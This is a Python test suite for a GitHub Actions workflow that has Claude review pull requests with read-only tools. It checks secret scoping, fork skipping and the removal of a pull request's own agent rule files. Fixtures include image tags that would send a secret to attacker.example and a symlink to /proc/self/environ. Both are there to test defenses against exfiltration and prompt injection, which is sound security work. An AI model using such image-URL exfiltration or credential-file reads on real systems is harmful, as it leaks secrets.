"""Run with: python3 -m unittest discover -s tests"""
import os
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import test_review_pr_workflow as single  # noqa: E402 (the import needs tests/ on the path first)

ROOT = Path(__file__).resolve().parent.parent
WORKFLOW = ROOT / ".github" / "workflows" / "review-pr.yml"
README = ROOT / "examples" / "ci" / "README.md"

CREDENTIAL = "Fail when the harness has no credential"
HARNESS = "Check out the harness"
HARNESS_SHA = "Say which harness commit reviews"
BASE = "Check out the pull request's base"
HEAD = "Check out the pull request's head"
PROMPT = "Run the review-pr skill: build the prompt"
CLAUDE = "Run the review-pr skill on Claude"
POST = "Post the report as one comment"
RULES = "Remove the pull request's own rules"


def children(text, key):
    """The keys directly under a top-level `key:`, by their indent."""
    lines = text.splitlines()
    start = next(i for i, line in enumerate(lines) if line == key + ":")
    out = []
    for line in lines[start + 1:]:
        if line.strip() and not line.startswith(" "):
            break
        match = re.match(r"^  ([a-z_-]+):", line)
        if match:
            out.append(match.group(1))
    return out


def fenced(text, language):
    """The bodies of the ```language fences in a Markdown file."""
    return re.findall(r"^```{}\n(.*?)^```".format(re.escape(language)), text, re.M | re.S)


class ReusableReviewWorkflow(unittest.TestCase):
    steps = single.ReviewPrWorkflow.steps
    step = single.ReviewPrWorkflow.step
    run_step = single.ReviewPrWorkflow.run_step

    def setUp(self):
        self.assertTrue(WORKFLOW.is_file(), ".github/workflows/review-pr.yml doesn't exist")
        self.text = WORKFLOW.read_text()
        self.code = single.code(self.text)

    def names(self):
        return [name for name, _ in self.steps()]

    def secrets_in(self, name):
        return set(re.findall(r"secrets\.(\w+)", self.step(name)))

    def run_in(self, name, cwd, **env):
        """Run a step's script from `cwd`, as Actions would from the workspace."""
        script = self.step(name).split("run: |\n", 1)[1]
        return subprocess.run(["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", textwrap.dedent(script)],
                              cwd=cwd, env={"PATH": os.environ["PATH"], **env}, capture_output=True, text=True)

    def test_it_runs_only_when_another_workflow_calls_it(self):
        self.assertEqual(children(self.code, "on"), ["workflow_call"])
        self.assertNotIn("pull_request_target", self.text)

    def test_it_takes_the_harness_repo_and_two_optional_secrets(self):
        on = self.code.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]
        self.assertRegex(on, r"harness-repo:\n(?:\s+\S.*\n)*?\s+required: true\n(?:\s+\S.*\n)*?\s+type: string")
        for name in ("ANTHROPIC_API_KEY", "HARNESS_DEPLOY_KEY"):
            self.assertRegex(on, r"{}:\n(?:\s+description: .*\n)?\s+required: false".format(name))

    def test_permissions_are_read_contents_and_write_comments_only(self):
        self.assertEqual(sorted(single.block(self.code, "permissions")), ["contents: read", "pull-requests: write"])
        self.assertEqual(len(re.findall(r"^\s*permissions:", self.code, re.M)), 1)
        self.assertNotIn("write-all", self.text)

    def test_claude_runs_restricted_with_read_tools_only(self):
        call = re.search(r"claude -p[^<]*", self.step(CLAUDE))
        self.assertIsNotNone(call, "no claude -p call")
        self.assertEqual(call.group(0).split(),
                         ["claude", "-p", "--max-turns", "30", "--restricted", "--strict-mcp-config",
                          "--tools", "Read,Grep,Glob", "\\"])
        self.assertIn("npm install -g @anthropic-ai/claude-code@2.1.296", self.code)
        self.assertIn('cd "$GITHUB_WORKSPACE"', self.step(CLAUDE))
        self.assertIn('grep -qF -e "$ANTHROPIC_API_KEY"', self.step(CLAUDE))

    def test_claude_is_the_only_reviewer_and_gets_no_shell(self):
        self.assertIsNone(re.search(r"codex|ollama", self.text, re.I))
        self.assertNotRegex(self.text, r"\bBash\b")
        self.assertNotIn("--allowedTools", self.text)
        self.assertNotIn("--dangerously-skip-permissions", self.text)

    def test_no_expression_is_expanded_inside_a_script(self):
        self.assertTrue(single.run_lines(self.code), "found no run: blocks to check")
        for line in single.run_lines(self.code):
            self.assertNotIn("${{", line, "pass it through env: and read it as a variable")

    def test_secrets_are_only_ever_referenced_by_name(self):
        for number, line in enumerate(self.text.splitlines(), 1):
            self.assertNotIn("secrets.", single.SECRET_REF.sub("", line), "line {}".format(number))
        self.assertIsNone(single.KEY_SHAPES.search(self.text), "something in the file looks like a key")

    def test_a_missing_deploy_key_fails_and_names_it(self):
        result, output, _ = self.run_step(CREDENTIAL, HARNESS_DEPLOY_KEY="")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("::error::", result.stdout)
        self.assertIn("HARNESS_DEPLOY_KEY", result.stdout)
        self.assertEqual(output, "")
        result, output, _ = self.run_step(CREDENTIAL, HARNESS_DEPLOY_KEY="k")
        self.assertEqual(result.returncode, 0, result.stdout)

    def test_a_missing_anthropic_key_skips_with_a_notice(self):
        result, _, added = self.run_step("Skip when Claude has no key")
        self.assertEqual(result.returncode, 0)
        self.assertIn("REVIEW_SKIPPED=true", added)
        self.assertIn("::notice::", result.stdout)

    def test_a_pull_request_from_a_fork_skips_with_a_notice(self):
        result, output, _ = self.run_step("Skip a pull request from a fork", HEAD_REPO="fork/r", THIS_REPO="o/r")
        self.assertEqual(result.returncode, 0)
        self.assertIn("review=false", output)
        self.assertIn("::notice::", result.stdout)
        result, output, _ = self.run_step("Skip a pull request from a fork")
        self.assertIn("review=true", output)

    def test_the_fork_check_compares_with_the_calling_repo(self):
        scope = self.step("Skip a pull request from a fork")
        self.assertIn("THIS_REPO: ${{ github.repository }}", scope)
        self.assertIn("HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}", scope)
        self.assertNotIn("harness", scope)

    def test_the_steps_run_in_the_planned_order(self):
        names = self.names()
        order = ["Skip a pull request from a fork", "Skip when Claude has no key", CREDENTIAL, HARNESS,
                 HARNESS_SHA, BASE, HEAD, "Remove the pull request's own rules", PROMPT, CLAUDE, POST]
        self.assertEqual([name for name in names if name in order], order)

    def test_a_skipped_review_runs_nothing_after_the_key_check(self):
        names = self.names()
        for name, text in self.steps()[names.index("Skip when Claude has no key") + 1:]:
            self.assertIn("steps.scope.outputs.review == 'true'", text, name)
            self.assertIn("env.REVIEW_SKIPPED != 'true'", text, name)
        self.assertNotIn("always()", self.code)

    def test_the_harness_comes_from_its_default_branch_with_the_deploy_key(self):
        harness = self.step(HARNESS)
        self.assertIn("repository: ${{ inputs.harness-repo }}", harness)
        self.assertIn("ssh-key: ${{ secrets.HARNESS_DEPLOY_KEY }}", harness)
        self.assertIn("path: harness", harness)
        self.assertIn("persist-credentials: false", harness)
        self.assertNotRegex(harness, r"(?m)^\s+ref:")
        sha = self.step(HARNESS_SHA)
        self.assertIn('echo "Harness commit: $(git -C harness rev-parse HEAD)"', sha)
        self.assertIn("harness/skills/review-pr/SKILL.md", sha)
        self.assertIn("::error::", sha)
        self.assertIn("HARNESS_DEPLOY_KEY", sha)
        self.assertIn("inputs.harness-repo", sha)
        self.assertRegex(sha, r"exit [1-9]")

    def test_a_harness_without_the_skill_fails(self):
        result, _, _ = self.run_step(HARNESS_SHA, HARNESS_REPO="o/not-a-harness")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("o/not-a-harness", result.stdout)

    def test_the_project_s_rules_come_from_its_base(self):
        base = self.step(BASE)
        self.assertIn("ref: ${{ github.event.pull_request.base.sha }}", base)
        self.assertIn("path: base", base)
        head = self.step(HEAD)
        self.assertIn("path: head", head)
        self.assertIn("fetch-depth: 0", head)
        for name in (BASE, HEAD):
            self.assertIn("persist-credentials: false", self.step(name), name)
            self.assertNotIn("ssh-key", self.step(name), name)
        self.assertIn("find head", self.step(RULES))

    def test_the_pull_request_s_rules_go_at_any_depth(self):
        with tempfile.TemporaryDirectory() as tmp:
            head = Path(tmp) / "head"
            gone = ["AGENTS.md", "CLAUDE.md", "CLAUDE.local.md", "src/CLAUDE.md", "src/CLAUDE.local.md",
                    "deep/a/AGENTS.md", ".claude/settings.json", "src/.claude/agents/x.md"]
            kept = ["README.md", "src/app.py", "docs/CLAUDE.md.txt", ".git/config", ".git/CLAUDE.md"]
            for path in gone + kept:
                (head / path).parent.mkdir(parents=True, exist_ok=True)
                (head / path).write_text("x")
            (head / "docs" / "CLAUDE.md").symlink_to("../README.md")
            (head / "environ").symlink_to("/proc/self/environ")
            (head / "outside").symlink_to(tmp)
            result = self.run_in(RULES, tmp)
            self.assertEqual(result.returncode, 0, result.stderr)
            for path in gone + ["docs/CLAUDE.md", "environ", "outside", ".claude", "src/.claude"]:
                self.assertFalse(os.path.lexists(head / path), path)
            for path in kept:
                self.assertTrue((head / path).is_file(), path)

    def test_the_posted_report_carries_no_image(self):
        with tempfile.TemporaryDirectory() as tmp:
            bin_dir = Path(tmp) / "bin"
            bin_dir.mkdir()
            (bin_dir / "gh").write_text("#!/bin/sh\nexit 0\n")
            (bin_dir / "gh").chmod(0o755)
            (Path(tmp) / "report.md").write_text(
                "Changes needed.\n"
                "![x](https://attacker.example/a?k=secret)\n"
                "![ref][1]\n"
                '<img src="https://attacker.example/b">\n'
                '<IMG SRC="https://attacker.example/c">\n'
                '<picture><source srcset="https://attacker.example/d"></picture>\n'
                "`Vec<String>` is fine.\n")
            result = self.run_in(POST, tmp, RUNNER_TEMP=tmp, PATH=f"{bin_dir}:{os.environ['PATH']}",
                                 REPO="o/r", PR="1", GH_TOKEN="")
            self.assertEqual(result.returncode, 0, result.stderr)
            comment = (Path(tmp) / "comment.md").read_text()
            self.assertNotIn("![", comment)
            self.assertNotRegex(comment, r"(?i)<\s*/?\s*(img|picture|source)\b")
            self.assertIn("Changes needed.", comment)
            self.assertIn("`Vec<String>` is fine.", comment)

    def test_the_prompt_points_at_the_three_folders(self):
        prompt = self.step(PROMPT)
        for text in ("harness/skills/review-pr/SKILL.md", "harness/AGENTS.md", "base/AGENTS.md",
                     "base/CLAUDE.md", "under head/"):
            self.assertIn(text, prompt)
        self.assertRegex(prompt, r"under base/\s+only, never under head/")
        self.assertIn("<<'EOF'", prompt)
        self.assertIn('git -C head diff "$BASE_SHA...HEAD" > "$RUNNER_TEMP/diff.patch"', prompt)
        self.assertIn('head -c 60000 "$RUNNER_TEMP/diff.patch" >> "$RUNNER_TEMP/prompt.md"', prompt)
        self.assertNotIn("| head", prompt, "a pipe into head fails under pipefail on a big diff")

    def test_the_deploy_key_reaches_only_the_check_and_the_harness_checkout(self):
        holding = [name for name, text in self.steps() if "secrets.HARNESS_DEPLOY_KEY" in text]
        self.assertEqual(sorted(holding), sorted([CREDENTIAL, HARNESS]))
        for name in (PROMPT, CLAUDE, POST):
            self.assertNotIn("HARNESS_DEPLOY_KEY", self.step(name), name)

    def test_each_step_holds_only_its_own_key(self):
        self.assertEqual(self.secrets_in(CLAUDE), {"ANTHROPIC_API_KEY"})
        self.assertEqual(self.secrets_in("Skip when Claude has no key"), {"ANTHROPIC_API_KEY"})
        self.assertEqual(self.secrets_in(CREDENTIAL), {"HARNESS_DEPLOY_KEY"})
        for name in (PROMPT, POST, BASE, HEAD, HARNESS_SHA):
            self.assertEqual(self.secrets_in(name), set(), name)

    def test_the_comment_goes_on_the_calling_repo_after_the_checkouts(self):
        post = self.step(POST)
        self.assertIn("REPO: ${{ github.repository }}", post)
        self.assertNotIn("harness-repo", post)
        names = self.names()
        for name in (HARNESS, HARNESS_SHA, BASE, HEAD):
            self.assertLess(names.index(name), names.index(POST), name)

    def test_the_header_says_it_never_approves_or_merges(self):
        header = self.text.split("\nname:", 1)[0]
        self.assertIn("never", header)
        for word in ("approves", "merges", "examples/ci/README.md", "HARNESS_DEPLOY_KEY", "ANTHROPIC_API_KEY"):
            self.assertIn(word, header)


class CallerReadme(unittest.TestCase):
    def setUp(self):
        self.assertTrue(README.is_file(), "examples/ci/README.md doesn't exist")
        self.text = README.read_text()

    def test_the_headings_come_in_order(self):
        headings = re.findall(r"^## (.+)$", self.text, re.M)
        self.assertEqual(headings, ["The credential", "The caller", "The secret", "A private harness repo"])

    def test_the_caller_calls_the_workflow_and_passes_both_secrets(self):
        blocks = fenced(self.text, "yaml")
        self.assertEqual(len(blocks), 1, "one ```yaml block, the caller")
        caller = blocks[0]
        self.assertIn("uses: your-org/harness/.github/workflows/review-pr.yml@main", caller)
        self.assertIn("harness-repo: your-org/harness", caller)
        for name in ("ANTHROPIC_API_KEY", "HARNESS_DEPLOY_KEY"):
            self.assertIn("{0}: ${{{{ secrets.{0} }}}}".format(name), caller)
        self.assertIn("types: [opened, synchronize, reopened]", caller)
        self.assertNotIn("secrets: inherit", caller)
        self.assertNotIn("skills/", caller)
        self.assertNotIn("pull_request_target", caller)

    def test_the_caller_asks_for_the_same_permissions(self):
        caller = fenced(self.text, "yaml")[0]
        self.assertEqual(sorted(single.block(caller, "permissions")), ["contents: read", "pull-requests: write"])
        self.assertIn("group: review-pr-${{ github.event.pull_request.number }}", caller)

    def test_the_key_is_read_only(self):
        credential = self.text.split("## The credential", 1)[1].split("## The caller", 1)[0]
        self.assertIn("Allow write access", credential)
        self.assertIsNone(single.KEY_SHAPES.search(self.text), "something in the README looks like a key")

    def test_it_lists_the_other_examples(self):
        for name in ("loop.yml", "project-checks.yml", "review-pr.yml"):
            self.assertIn("examples/ci/" + name, self.text)

    def test_the_skill_points_at_the_readme(self):
        skill = (ROOT / "skills" / "review-pr" / "SKILL.md").read_text()
        self.assertIn("examples/ci/README.md", skill)


if __name__ == "__main__":
    unittest.main()
